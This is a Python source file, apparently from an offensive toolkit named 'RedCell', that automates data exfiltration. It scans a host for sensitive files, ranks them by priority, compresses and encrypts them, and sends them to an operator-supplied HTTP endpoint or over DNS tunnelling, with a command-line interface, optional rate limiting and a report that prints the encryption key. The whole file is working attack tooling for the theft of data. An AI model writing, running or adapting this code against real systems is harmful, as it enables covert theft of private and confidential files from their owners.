"""
Automated Exfiltration Scanner

Comprehensive automated data exfiltration workflow.
"""

import os
import time
from typing import Dict, List, Optional
from datetime import datetime
import json

from exfiltration.data_discovery import DataDiscovery, SensitiveFile
from exfiltration.exfil_http import HTTPExfiltration
from exfiltration.exfil_dns import DNSTunneling
from exfiltration.data_prep import DataPreparation


class AutomatedExfiltration:
    """
    Automated data exfiltration scanner.

    Workflow:
    1. Discover sensitive data
    2. Prioritize targets
    3. Prepare data (compress, encrypt)
    4. Exfiltrate via selected channel
    5. Generate comprehensive report
    """

    def __init__(
        self,
        exfil_method: str = 'http',
        exfil_url: str = None,
        exfil_domain: str = None,
        encrypt: bool = True,
        compress: bool = True,
        verbose: bool = False
    ):
        """
        Initialize automated exfiltration.

        Args:
            exfil_method: Exfiltration method (http or dns)
            exfil_url: HTTP exfiltration URL
            exfil_domain: DNS tunneling domain
            encrypt: Encrypt data before exfiltration
            compress: Compress data before exfiltration
            verbose: Verbose output
        """
        self.exfil_method = exfil_method
        self.exfil_url = exfil_url
        self.exfil_domain = exfil_domain
        self.encrypt = encrypt
        self.compress = compress
        self.verbose = verbose

        # Components
        self.discovery = DataDiscovery(verbose=verbose)
        self.data_prep = DataPreparation() if encrypt else None

        # Exfiltration channel
        if exfil_method == 'http' and exfil_url:
            self.exfil_channel = HTTPExfiltration(target_url=exfil_url)
        elif exfil_method == 'dns' and exfil_domain:
            self.exfil_channel = DNSTunneling(domain=exfil_domain)
        else:
            self.exfil_channel = None

        # Results
        self.scan_results = {
            'start_time': datetime.now().isoformat(),
            'exfil_method': exfil_method,
            'encrypt': encrypt,
            'compress': compress
        }

        self.files_exfiltrated = 0
        self.bytes_exfiltrated = 0
        self.files_failed = 0

    def run_full_scan(
        self,
        search_paths: List[str] = None,
        max_file_size: int = 10 * 1024 * 1024,  # 10MB
        rate_limit: float = 0
    ) -> Dict:
        """
        Run full automated exfiltration scan.

        Args:
            search_paths: Paths to search (default: common user directories)
            max_file_size: Maximum file size to exfiltrate (bytes)
            rate_limit: Delay between exfiltrations (seconds)

        Returns:
            Scan results dictionary
        """
        print("=" * 80)
        print("REDCELL AUTOMATED DATA EXFILTRATION")
        print("=" * 80)
        print(f"Start time: {self.scan_results['start_time']}")
        print(f"Exfiltration method: {self.exfil_method}")
        print(f"Encryption: {self.encrypt}")
        print(f"Compression: {self.compress}")
        print("=" * 80)

        # Phase 1: Discovery
        print("\n[*] Phase 1: Data Discovery")
        print("-" * 80)
        self._discover_data(search_paths)

        # Phase 2: Prioritization
        print("\n[*] Phase 2: Target Prioritization")
        print("-" * 80)
        targets = self._prioritize_targets(max_file_size)

        # Phase 3: Exfiltration
        print("\n[*] Phase 3: Data Exfiltration")
        print("-" * 80)
        self._exfiltrate_targets(targets, rate_limit)

        # Finalize results
        self.scan_results['end_time'] = datetime.now().isoformat()
        self.scan_results['files_discovered'] = len(self.discovery.discovered_files)
        self.scan_results['files_exfiltrated'] = self.files_exfiltrated
        self.scan_results['bytes_exfiltrated'] = self.bytes_exfiltrated
        self.scan_results['files_failed'] = self.files_failed

        if self.encrypt and self.data_prep:
            self.scan_results['encryption_key'] = self.data_prep.get_key_base64()

        return self.scan_results

    def _discover_data(self, search_paths: List[str] = None):
        """
        Discover sensitive data.

        Args:
            search_paths: Paths to search
        """
        # Discover all data
        self.discovery.discover_all(search_paths=search_paths)

        print(f"\n[+] Discovery complete")
        print(f"    Total files found: {len(self.discovery.discovered_files)}")

        # By category
        categories = {}
        for f in self.discovery.discovered_files:
            categories[f.category] = categories.get(f.category, 0) + 1

        print(f"\n    By category:")
        for category, count in sorted(categories.items(), key=lambda x: x[1], reverse=True):
            print(f"      {category}: {count}")

        # By confidence
        confidence_levels = {}
        for f in self.discovery.discovered_files:
            confidence_levels[f.confidence] = confidence_levels.get(f.confidence, 0) + 1

        print(f"\n    By confidence:")
        for confidence in ['critical', 'high', 'medium', 'low']:
            count = confidence_levels.get(confidence, 0)
            if count > 0:
                print(f"      {confidence.upper()}: {count}")

    def _prioritize_targets(self, max_file_size: int) -> List[SensitiveFile]:
        """
        Prioritize exfiltration targets.

        Args:
            max_file_size: Maximum file size

        Returns:
            Prioritized list of files
        """
        # Priority order
        priority_order = {
            'critical': 4,
            'high': 3,
            'medium': 2,
            'low': 1
        }

        # Filter by size
        targets = [f for f in self.discovery.discovered_files if f.size <= max_file_size]

        # Sort by confidence
        targets.sort(key=lambda f: priority_order.get(f.confidence, 0), reverse=True)

        print(f"\n[+] Prioritization complete")
        print(f"    Files within size limit: {len(targets)}")

        # Show top targets
        critical_targets = [f for f in targets if f.confidence == 'critical']
        if critical_targets:
            print(f"\n    Top CRITICAL targets ({len(critical_targets)}):")
            for i, f in enumerate(critical_targets[:5], 1):
                print(f"      [{i}] {f.file_path} ({f.size / 1024:.1f} KB)")

        return targets

    def _exfiltrate_targets(self, targets: List[SensitiveFile], rate_limit: float):
        """
        Exfiltrate target files.

        Args:
            targets: Files to exfiltrate
            rate_limit: Delay between exfiltrations
        """
        if not self.exfil_channel:
            print("[-] No exfiltration channel configured")
            return

        print(f"\n[*] Starting exfiltration of {len(targets)} files...")

        for i, target in enumerate(targets, 1):
            print(f"\n[{i}/{len(targets)}] Exfiltrating: {target.file_path}")
            print(f"    Category: {target.category} | Confidence: {target.confidence}")
            print(f"    Size: {target.size / 1024:.1f} KB")

            try:
                # Prepare file path
                file_to_exfil = target.file_path

                # Compress if enabled
                if self.compress and target.size > 100 * 1024:  # Compress files >100KB
                    temp_compressed = file_to_exfil + '.gz'
                    DataPreparation.compress_gzip(file_to_exfil, temp_compressed)
                    file_to_exfil = temp_compressed

                # Encrypt if enabled
                if self.encrypt:
                    temp_encrypted = file_to_exfil + '.enc'
                    self.data_prep.encrypt_file(file_to_exfil, temp_encrypted)

                    # Clean up compressed file if different
                    if self.compress and target.size > 100 * 1024:
                        if os.path.exists(file_to_exfil):
                            os.remove(file_to_exfil)

                    file_to_exfil = temp_encrypted

                # Exfiltrate
                metadata = {
                    'original_path': target.file_path,
                    'category': target.category,
                    'confidence': target.confidence,
                    'encrypted': self.encrypt,
                    'compressed': self.compress
                }

                success = False

                if self.exfil_method == 'http':
                    success = self.exfil_channel.exfiltrate_file(
                        file_to_exfil,
                        metadata=metadata,
                        rate_limit=rate_limit
                    )

                elif self.exfil_method == 'dns':
                    success = self.exfil_channel.exfiltrate_file(
                        file_to_exfil,
                        session_id=self.exfil_channel.get_stats().get('session_id')
                    )

                # Clean up temp files
                if self.encrypt and os.path.exists(temp_encrypted):
                    os.remove(temp_encrypted)

                if success:
                    self.files_exfiltrated += 1
                    self.bytes_exfiltrated += target.size
                    print(f"    [+] Success")
                else:
                    self.files_failed += 1
                    print(f"    [-] Failed")

                # Rate limiting
                if rate_limit > 0 and i < len(targets):
                    time.sleep(rate_limit)

            except Exception as e:
                print(f"    [-] Error: {e}")
                self.files_failed += 1
                continue

        print(f"\n[+] Exfiltration complete")
        print(f"    Files exfiltrated: {self.files_exfiltrated}")
        print(f"    Files failed: {self.files_failed}")
        print(f"    Data exfiltrated: {self.bytes_exfiltrated / (1024*1024):.2f} MB")

    def exfiltrate_specific_category(
        self,
        category: str,
        max_files: int = None,
        rate_limit: float = 0
    ) -> Dict:
        """
        Exfiltrate specific category of files.

        Args:
            category: Category to exfiltrate
            max_files: Maximum number of files
            rate_limit: Delay between files

        Returns:
            Results dictionary
        """
        # Filter by category
        targets = self.discovery.filter_by_category(category)

        if max_files:
            targets = targets[:max_files]

        print(f"[*] Exfiltrating {len(targets)} files from category: {category}")

        self._exfiltrate_targets(targets, rate_limit)

        return {
            'category': category,
            'files_exfiltrated': self.files_exfiltrated,
            'bytes_exfiltrated': self.bytes_exfiltrated
        }

    def generate_report(self) -> str:
        """
        Generate comprehensive exfiltration report.

        Returns:
            Formatted report string
        """
        report = []
        report.append("=" * 80)
        report.append("AUTOMATED DATA EXFILTRATION REPORT")
        report.append("=" * 80)

        # Summary
        report.append(f"\nExfiltration Method: {self.scan_results['exfil_method']}")
        report.append(f"Start Time: {self.scan_results['start_time']}")
        report.append(f"End Time: {self.scan_results.get('end_time', 'N/A')}")
        report.append(f"Encryption: {self.encrypt}")
        report.append(f"Compression: {self.compress}")

        # Statistics
        report.append("\n" + "=" * 80)
        report.append("STATISTICS")
        report.append("=" * 80)
        report.append(f"\nFiles Discovered: {self.scan_results.get('files_discovered', 0)}")
        report.append(f"Files Exfiltrated: {self.files_exfiltrated}")
        report.append(f"Files Failed: {self.files_failed}")
        report.append(f"Data Exfiltrated: {self.bytes_exfiltrated / (1024*1024):.2f} MB")

        # Success rate
        if self.files_exfiltrated + self.files_failed > 0:
            success_rate = (self.files_exfiltrated / (self.files_exfiltrated + self.files_failed)) * 100
            report.append(f"Success Rate: {success_rate:.1f}%")

        # Encryption key
        if self.encrypt and 'encryption_key' in self.scan_results:
            report.append("\n" + "=" * 80)
            report.append("ENCRYPTION KEY (SAVE THIS!)")
            report.append("=" * 80)
            report.append(f"\n{self.scan_results['encryption_key']}")

        # Discovery report
        if self.discovery.discovered_files:
            report.append("\n" + "=" * 80)
            report.append("DISCOVERY SUMMARY")
            report.append("=" * 80)
            report.append(self.discovery.generate_report())

        report.append("\n" + "=" * 80)
        return "\n".join(report)

    def export_results(self, filename: str):
        """
        Export results to JSON.

        Args:
            filename: Output filename
        """
        with open(filename, 'w') as f:
            json.dump(self.scan_results, f, indent=2)

        print(f"\n[+] Results exported to: {filename}")


def main():
    """Main function for standalone usage."""
    import argparse

    parser = argparse.ArgumentParser(description='RedCell Automated Data Exfiltration')

    # Exfiltration method
    parser.add_argument('--method', choices=['http', 'dns'], default='http',
                       help='Exfiltration method')
    parser.add_argument('--url', help='HTTP exfiltration URL')
    parser.add_argument('--domain', help='DNS tunneling domain')

    # Options
    parser.add_argument('--search', nargs='+', help='Paths to search')
    parser.add_argument('--category', help='Exfiltrate specific category only')
    parser.add_argument('--max-size', type=int, default=10*1024*1024,
                       help='Max file size (bytes)')
    parser.add_argument('--max-files', type=int, help='Max files to exfiltrate')
    parser.add_argument('--rate-limit', type=float, default=0,
                       help='Delay between exfiltrations (seconds)')

    parser.add_argument('--no-encrypt', action='store_true',
                       help='Disable encryption')
    parser.add_argument('--no-compress', action='store_true',
                       help='Disable compression')

    parser.add_argument('--export', help='Export results to JSON')
    parser.add_argument('--verbose', '-v', action='store_true',
                       help='Verbose output')

    args = parser.parse_args()

    # Validate
    if args.method == 'http' and not args.url:
        print("[-] HTTP method requires --url")
        return

    if args.method == 'dns' and not args.domain:
        print("[-] DNS method requires --domain")
        return

    # Initialize
    scanner = AutomatedExfiltration(
        exfil_method=args.method,
        exfil_url=args.url,
        exfil_domain=args.domain,
        encrypt=not args.no_encrypt,
        compress=not args.no_compress,
        verbose=args.verbose
    )

    # Run scan
    if args.category:
        # Discover first
        scanner.discovery.discover_all(search_paths=args.search)

        # Exfiltrate category
        scanner.exfiltrate_specific_category(
            category=args.category,
            max_files=args.max_files,
            rate_limit=args.rate_limit
        )
    else:
        # Full scan
        results = scanner.run_full_scan(
            search_paths=args.search,
            max_file_size=args.max_size,
            rate_limit=args.rate_limit
        )

    # Generate report
    print("\n")
    print(scanner.generate_report())

    # Export if requested
    if args.export:
        scanner.export_results(args.export)


if __name__ == '__main__':
    main()
